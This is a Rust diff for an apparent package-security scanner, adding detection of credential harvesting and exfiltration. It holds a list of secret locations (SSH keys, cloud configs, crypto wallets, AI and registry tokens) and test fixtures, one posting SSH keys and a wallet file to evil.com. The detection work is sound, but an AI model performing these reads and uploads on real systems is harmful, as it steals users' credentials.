@@ -103,6 +103,7 @@ pub enum Capability {
     Serialization,
     Reflection,
     EnvironmentAccess,
+    CredentialHarvesting,
 }
 
 /// A detected capability usage at a specific location.
@@ -176,6 +177,12 @@ pub enum SuspiciousPattern {
         file: String,
         line: u32,
         evidence: String,
+    },
+    /// Credential harvesting combined with network access.
+    CredentialExfiltration {
+        file: String,
+        line: u32,
+        credential_types: Vec<String>,
     },
     /// URL to a domain not matching the package's official URLs.
     SuspiciousDomain {
@@ -261,6 +268,43 @@ const CAPABILITY_PATTERNS: &[(&str, Capability, bool)] = &[
     ("os.environ", Capability::EnvironmentAccess, false),
     ("os.getenv(", Capability::EnvironmentAccess, false),
     ("from dotenv", Capability::EnvironmentAccess, true),
+    // Credential harvesting — file path patterns
+    (".ssh/id_rsa", Capability::CredentialHarvesting, false),
+    (".ssh/id_ed25519", Capability::CredentialHarvesting, false),
+    (".ssh/known_hosts", Capability::CredentialHarvesting, false),
+    (".ssh/authorized_keys", Capability::CredentialHarvesting, false),
+    (".gnupg/", Capability::CredentialHarvesting, false),
+    (".aws/credentials", Capability::CredentialHarvesting, false),
+    (".aws/config", Capability::CredentialHarvesting, false),
+    (".config/gcloud/", Capability::CredentialHarvesting, false),
+    (".azure/", Capability::CredentialHarvesting, false),
+    (".kube/config", Capability::CredentialHarvesting, false),
+    ("KUBECONFIG", Capability::CredentialHarvesting, false),
+    // Crypto wallets
+    (".bitcoin/", Capability::CredentialHarvesting, false),
+    (".ethereum/", Capability::CredentialHarvesting, false),
+    ("wallet.dat", Capability::CredentialHarvesting, false),
+    (".solana/", Capability::CredentialHarvesting, false),
+    ("phantom", Capability::CredentialHarvesting, false),
+    ("metamask", Capability::CredentialHarvesting, false),
+    // AI/LLM credentials
+    (".claude/", Capability::CredentialHarvesting, false),
+    (".config/claude", Capability::CredentialHarvesting, false),
+    ("ANTHROPIC_API_KEY", Capability::CredentialHarvesting, false),
+    ("OPENAI_API_KEY", Capability::CredentialHarvesting, false),
+    ("GOOGLE_AI_KEY", Capability::CredentialHarvesting, false),
+    ("GEMINI_API_KEY", Capability::CredentialHarvesting, false),
+    // Package manager tokens
+    (".npmrc", Capability::CredentialHarvesting, false),
+    (".pypirc", Capability::CredentialHarvesting, false),
+    ("NPM_TOKEN", Capability::CredentialHarvesting, false),
+    ("PYPI_TOKEN", Capability::CredentialHarvesting, false),
+    ("CARGO_REGISTRY_TOKEN", Capability::CredentialHarvesting, false),
+    // Git credentials
+    (".git-credentials", Capability::CredentialHarvesting, false),
+    ("GITHUB_TOKEN", Capability::CredentialHarvesting, false),
+    ("GH_TOKEN", Capability::CredentialHarvesting, false),
+    ("GITLAB_TOKEN", Capability::CredentialHarvesting, false),
 ];
 
 /// Branch-starting keywords for Python.
@@ -665,6 +709,63 @@ fn detect_suspicious_patterns(
             }
         }
 
+        // CredentialExfiltration: credential harvesting + network
+        let has_cred = cap_set.contains(&Capability::CredentialHarvesting);
+        let has_net = cap_set.contains(&Capability::Network);
+        if has_cred && has_net {
+            // Collect what types of credentials are being accessed
+            let cred_types: Vec<String> = caps
+                .iter()
+                .filter(|c| c.capability == Capability::CredentialHarvesting)
+                .map(|c| {
+                    if c.evidence.contains(".ssh") {
+                        "ssh_keys"
+                    } else if c.evidence.contains(".aws") || c.evidence.contains("AWS") {
+                        "aws_credentials"
+                    } else if c.evidence.contains("wallet")
+                        || c.evidence.contains(".bitcoin")
+                        || c.evidence.contains(".ethereum")
+                        || c.evidence.contains(".solana")
+                    {
+                        "crypto_wallets"
+                    } else if c.evidence.contains("claude")
+                        || c.evidence.contains("ANTHROPIC")
+                        || c.evidence.contains("OPENAI")
+                        || c.evidence.contains("GEMINI")
+                    {
+                        "ai_credentials"
+                    } else if c.evidence.contains(".npmrc")
+                        || c.evidence.contains("NPM_TOKEN")
+                        || c.evidence.contains(".pypirc")
+                    {
+                        "package_tokens"
+                    } else if c.evidence.contains("GITHUB")
+                        || c.evidence.contains("GITLAB")
+                        || c.evidence.contains(".git-credentials")
+                    {
+                        "git_tokens"
+                    } else {
+                        "other_credentials"
+                    }
+                })
+                .map(String::from)
+                .collect::<std::collections::HashSet<_>>()
+                .into_iter()
+                .collect();
+
+            let line = caps
+                .iter()
+                .find(|c| c.capability == Capability::CredentialHarvesting)
+                .map(|c| c.line)
+                .unwrap_or(0);
+
+            patterns.push(SuspiciousPattern::CredentialExfiltration {
+                file: path.clone(),
+                line,
+                credential_types: cred_types,
+            });
+        }
+
         // EncodedExecution: exec/eval + base64 in same file (regardless of network)
         if cap_set.contains(&Capability::Process) && cap_set.contains(&Capability::Encoding) {
             let line = caps
@@ -722,7 +823,7 @@ fn score_source_diff(
     for delta in deltas {
         if delta.is_escalation {
             score += match delta.capability {
-                Capability::Network | Capability::Process => 3.0,
+                Capability::Network | Capability::Process | Capability::CredentialHarvesting => 3.0,
                 _ => 2.0,
             };
         }
@@ -737,6 +838,7 @@ fn score_source_diff(
             SuspiciousPattern::ObfuscatedImport { .. } => 3.0,
             SuspiciousPattern::PthInjection { .. } => 5.0,
             SuspiciousPattern::EncodedExecution { .. } => 5.0,
+            SuspiciousPattern::CredentialExfiltration { .. } => 5.0,
             SuspiciousPattern::SuspiciousDomain { .. } => 2.0,
         };
     }
@@ -1140,5 +1242,84 @@ mod tests {
         std::fs::write(&pth_path, "/usr/lib/python3/dist-packages\n./lib\n").unwrap();
         let patterns = scan_pth_files(dir.path());
         assert!(patterns.is_empty(), "safe .pth should not be flagged");
+    }
+
+    #[test]
+    fn scan_ssh_credential_access() {
+        let source = "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n";
+        let caps = scan_capabilities(source, "stealer.py");
+        assert!(caps
+            .iter()
+            .any(|c| c.capability == Capability::CredentialHarvesting));
+    }
+
+    #[test]
+    fn scan_crypto_wallet_access() {
+        let source = "wallet_path = os.path.join(home, '.bitcoin/', 'wallet.dat')\n";
+        let caps = scan_capabilities(source, "miner.py");
+        assert!(caps
+            .iter()
+            .any(|c| c.capability == Capability::CredentialHarvesting));
+    }
+
+    #[test]
+    fn scan_ai_credential_access() {
+        let source = "key_name = 'ANTHROPIC_API_KEY'\napi_key = get_secret(key_name)\n";
+        let caps = scan_capabilities(source, "stealer.py");
+        assert!(caps
+            .iter()
+            .any(|c| c.capability == Capability::CredentialHarvesting));
+    }
+
+    #[test]
+    fn scan_npm_token_access() {
+        let source = "import os\nnpmrc = open(os.path.expanduser('~/.npmrc')).read()\n";
+        let caps = scan_capabilities(source, "worm.py");
+        assert!(caps
+            .iter()
+            .any(|c| c.capability == Capability::CredentialHarvesting));
+    }
+
+    #[test]
+    fn credential_exfiltration_pattern() {
+        let mut new_files = HashMap::new();
+        new_files.insert(
+            "stealer.py".to_string(),
+            "import httpx\nimport os\nkeys = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nwallet = open('.bitcoin/wallet.dat').read()\nhttpx.post('https://evil.com', data=keys+wallet)\n".to_string(),
+        );
+        let old_files = HashMap::new();
+        let patterns = detect_suspicious_patterns(&new_files, &old_files);
+        assert!(patterns
+            .iter()
+            .any(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. })));
+        // Check that credential types are identified
+        if let Some(SuspiciousPattern::CredentialExfiltration {
+            credential_types, ..
+        }) = patterns
+            .iter()
+            .find(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. }))
+        {
+            assert!(
+                credential_types.contains(&"ssh_keys".to_string())
+                    || credential_types.contains(&"crypto_wallets".to_string())
+            );
+        }
+    }
+
+    #[test]
+    fn no_credential_exfiltration_without_network() {
+        let mut new_files = HashMap::new();
+        // Reading credentials without network is suspicious but not exfiltration
+        new_files.insert(
+            "reader.py".to_string(),
+            "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nprint(key)\n"
+                .to_string(),
+        );
+        let old_files = HashMap::new();
+        let patterns = detect_suspicious_patterns(&new_files, &old_files);
+        // Should NOT flag as CredentialExfiltration (no network)
+        assert!(!patterns
+            .iter()
+            .any(|p| matches!(p, SuspiciousPattern::CredentialExfiltration { .. })));
     }
 }
